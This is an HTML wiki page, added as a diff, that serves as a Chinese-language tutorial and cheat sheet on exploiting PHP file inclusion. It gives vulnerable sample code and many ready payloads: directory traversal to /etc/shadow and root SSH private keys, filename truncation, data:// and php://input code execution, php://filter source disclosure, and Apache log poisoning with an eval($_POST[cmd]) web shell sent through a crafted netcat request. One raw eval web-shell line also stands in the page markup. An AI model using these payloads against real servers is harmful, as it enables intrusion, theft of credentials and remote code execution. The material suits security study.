@@ -1,0 +1,244 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
+        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
+        <title>php 文件包含 - Wiki | janes</title>
+        <meta name="keywords" content=""/>
+        <meta name="description" content=""/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    </head>
+
+    <body>
+        <div id="container">
+            
+<div id="header">
+  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;php 文件包含</div>
+</div>
+<div class="clearfix"></div>
+<div id="title">php 文件包含</div>
+  <div id="content">
+  <h2 id="_1">与文件包含相关的函数</h2>
+<p>require找不到被包含的文件时会产生致命错误，并停止脚本运行。</p>
+<p>include找不到被包含的文件时只会产生警告，脚本将继续运行。</p>
+<p>include_once与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
+<p>require_once与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</p>
+<h2 id="lfi-local-file-include">本地文件包含(LFI--Local File Include)</h2>
+<ul>
+<li>普通本地包含</li>
+</ul>
+<p>只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的php代码，则引入当前文件执行，若不含有效php代码，则直接输出文件内容</p>
+<p>样例：</p>
+<div class="hlcode"><pre><span class="err">#</span> <span class="nx">lfi</span><span class="p">.</span><span class="nx">php</span>
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</pre></div>
+
+
+<p>利用</p>
+<ul>
+<li>注入有效 php 代码</li>
+</ul>
+<div class="hlcode"><pre><span class="nx">echo</span> <span class="err">&quot;</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="s2">&quot; &gt;&gt; lfi.txt</span>
+
+<span class="s2"># browser</span>
+<span class="s2">http://127.0.0.1/lfi.php?file=lfi.txt</span>
+</pre></div>
+
+
+<ul>
+<li>目录遍历</li>
+</ul>
+<div class="hlcode"><pre><span class="cp"># linux 这两个文件存储着所有文件的路径，需要root权限</span>
+<span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mlocate</span><span class="o">/</span><span class="n">mlocate</span><span class="p">.</span><span class="n">db</span>
+<span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">locate</span><span class="p">.</span><span class="n">db</span>
+</pre></div>
+
+
+<ul>
+<li>包含错误日志</li>
+</ul>
+<div class="hlcode"><pre><span class="o">?</span><span class="n">ile</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
+</pre></div>
+
+
+<ul>
+<li>获取web目录或配置文件</li>
+</ul>
+<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+</pre></div>
+
+
+<ul>
+<li>包含上传附件</li>
+</ul>
+<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="n">attachment</span><span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">xx</span><span class="p">.</span><span class="n">file</span>
+</pre></div>
+
+
+<ul>
+<li>读取 session 文件</li>
+</ul>
+<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_xxxxx</span>
+</pre></div>
+
+
+<p>session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell</p>
+<ul>
+<li>如果拥有root权限还可以试试读这些东西：</li>
+</ul>
+<div class="hlcode"><pre><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
+
+<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
+
+<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">keystore</span>
+
+<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">pub</span>
+
+<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">known_hosts</span>
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>
+
+<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">bash_history</span>
+
+<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">mysql_history</span>
+
+<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">fd</span><span class="o">/</span><span class="n">fd</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">*</span> <span class="p">(</span><span class="err">文件标识符</span><span class="p">)</span>
+
+<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mounts</span>
+
+<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">config</span><span class="p">.</span><span class="n">gz</span>
+</pre></div>
+
+
+<h2 id="_2">截断本地包含</h2>
+<p>样例：</p>
+<div class="hlcode"><pre><span class="n">include</span><span class="p">(</span><span class="err">$</span><span class="n">a</span><span class="p">.</span><span class="s">&quot;.php&quot;</span><span class="p">);</span>
+</pre></div>
+
+
+<ul>
+<li>长文件名截断</li>
+</ul>
+<p>php版本小于5.2.8(?)可以成功</p>
+<p>windows和linux的文件名长度是有限制的，超过其长度的会被忽略，通常情况下windows的截断长度为260，linux的长度为4096，这一不用在意具体长度，只要把需要截断的字符串挤到后面就可以了</p>
+<p>样例：</p>
+<div class="hlcode"><pre><span class="cp">&lt;?php</span>  <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span>  
+
+<span class="err">#</span> <span class="nx">POC</span>
+<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/test/123.php?f=test.txt/././....../</span>
+</pre></div>
+
+
+<p>实例：</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236">长文件名截断: 济南大学主站本地文件包含导致代码执行</a></p>
+<p>1windows</p>
+<p>windows在文件名后加/.  或 .都是可以的</p>
+<div class="hlcode"><pre><span class="err">\</span><span class="p">.</span>
+<span class="p">.</span><span class="o">/</span>
+<span class="o">/</span>
+\
+</pre></div>
+
+
+<p>2linux</p>
+<div class="hlcode"><pre><span class="p">.</span><span class="o">/</span>
+<span class="o">/</span>
+</pre></div>
+
+
+<ul>
+<li>点号截断：</li>
+</ul>
+<p>?file=../../../../../../../../../boot.ini/......</p>
+<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
+<ul>
+<li>%00 截断包含</li>
+</ul>
+<blockquote>
+<p>gpc=off 和 php 版本限制</p>
+</blockquote>
+<h2 id="_3">远程包含</h2>
+<p>allow_url_include=On 就是远程文件包含，Off就是本地文件包含</p>
+<blockquote>
+<p>“zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)</p>
+</blockquote>
+<ul>
+<li>php 自带协议</li>
+</ul>
+<p>data://</p>
+<blockquote>
+<p>php5.0以下 和 php5.2 版本有效,allow_url_include=On</p>
+</blockquote>
+<div class="hlcode"><pre><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="o">:</span><span class="c1">//text/plain;base64,SSBsb3ZlIFBIUAo=</span>
+</pre></div>
+
+
+<p>php://input -- php的输入流，可以读到没有处理过的POST数据</p>
+<blockquote>
+<p>php5.0以下 和 php5.2 版本有效, allow_url_include=On</p>
+</blockquote>
+<h1 id="firefox-hackbar">firefox hackbar</h1>
+<p>?page=php://input</p>
+<p>post:
+&lt;?php system('ls');?&gt;</p>
+<div class="hlcode"><pre><span class="nl">php:</span><span class="c1">//filter -- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。</span>
+
+<span class="o">&gt;</span> <span class="n">php5</span><span class="mf">.0</span><span class="err">以下</span> <span class="err">和</span> <span class="n">php5</span><span class="mf">.2</span> <span class="err">版本有效</span>
+</pre></div>
+
+
+<p>?id=php://filter/convert.base64-encode/resource=test.txt </p>
+<p>?id=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt</p>
+<div class="hlcode"><pre><span class="nt">php</span><span class="o">://</span><span class="nt">fd</span>
+
+<span class="o">&gt;</span> <span class="nt">php</span> <span class="nt">5</span><span class="nc">.3.6</span><span class="err">中新增加</span>
+
+
+<span class="err">##</span> <span class="err">日记包含高级利用</span>
+
+<span class="cp">[</span><span class="err">济南大学主站本地文件包含导致代码执行</span><span class="cp">][</span><span class="mi">3</span><span class="cp">]</span>
+
+<span class="err">限制</span>
+
+<span class="o">&gt;</span> <span class="err">类似</span><span class="nt">http</span><span class="o">://</span><span class="nt">www</span><span class="nc">.exp.com</span><span class="o">/</span><span class="nt">index</span><span class="o">&lt;?</span><span class="nt">php</span> <span class="nt">eval</span><span class="o">(</span><span class="err">$</span><span class="nt">_POST</span><span class="cp">[</span><span class="nx">cmd</span><span class="cp">]</span><span class="o">);?&gt;</span><span class="nc">.php</span> 
+<span class="err">这样的提交，某些</span><span class="nt">WEB</span><span class="err">服务器将会把空格做</span><span class="nt">HTTP</span><span class="err">编码转成</span><span class="o">%</span><span class="nt">20</span><span class="err">写入</span><span class="nt">web</span><span class="err">日志</span><span class="o">,</span><span class="err">如果</span><span class="nt">PHP</span><span class="err">包含</span><span class="o">&lt;?</span><span class="nt">php</span><span class="o">%</span><span class="nt">20eval</span><span class="o">(</span><span class="err">$</span><span class="nt">_POST</span><span class="cp">[</span><span class="nx">cmd</span><span class="cp">]</span><span class="o">);?&gt;</span><span class="err">这样的语句肯定是不会成功的，所以我们必须把空格真正的写入</span><span class="nt">WEB</span><span class="err">日志</span><span class="o">.</span>
+
+<span class="err">突破</span>
+</pre></div>
+
+
+<?/**/eval($_POST[cmd]);/**/?>
+
+<div class="hlcode"><pre><span class="mi">1</span><span class="p">.</span><span class="nx">short_open_tag</span><span class="o">=</span><span class="nx">on</span>
+<span class="err">这类情况写入</span><span class="nx">web</span><span class="err">日志，只能在</span><span class="nx">short_open_tag</span><span class="o">=</span><span class="nx">on</span><span class="err">的情况下才能有效，当</span><span class="nx">short_open_tag</span><span class="o">=</span><span class="nx">off</span><span class="err">时，</span><span class="nx">PHP</span><span class="err">将不支持</span><span class="cp">&lt;?</span><span class="cm">/**/</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span><span class="cm">/**/</span><span class="cp">?&gt;</span><span class="err">这样的短语句</span>
+
+<span class="mi">2</span><span class="p">.</span><span class="nx">WEB</span><span class="err">服务器一个奇怪的特性</span>
+
+<span class="err">如果没有返回响应而</span><span class="nx">WEB</span><span class="err">服务器又接受了请求，那么请求的内容将原封不动的写入</span><span class="nx">WEB</span><span class="err">日志，不会进行</span><span class="nx">HTTP</span><span class="err">编码</span><span class="p">.</span>
+
+<span class="err">这样我们想个办法一直与</span><span class="nx">WEB</span><span class="err">服务器保持</span><span class="nx">TCP</span><span class="err">连接，不让</span><span class="nx">WEB</span><span class="err">服务器处理响应返回，然后再由客户端的我们中断这次</span><span class="nx">TCP</span><span class="err">连接，说得这么复杂其实很容易实现</span><span class="p">.</span><span class="err">只要在</span><span class="nx">HTTP</span><span class="err">请求的数据包中去掉</span><span class="nx">Connection</span> <span class="nx">HTTP</span><span class="err">标头值。</span>
+
+<span class="err">利用</span><span class="nx">NC</span><span class="err">伪造没有</span><span class="nx">Connection</span> <span class="nx">HTTP</span><span class="err">标头的请求包：</span>
+</pre></div>
+
+
+<p>GET /index&lt; &gt;.php HTTP/1.1
+Accept: <em>/</em>
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
+Host: 192.168.3.44
+```</p>
+<p>你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！</p>
+</div>
+
+        </div>
+        <div id="footer">
+            <span>
+                Copyright © 2012-2016 .
+                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
+            </span>
+        </div>
+        
+    </body>
+</html>
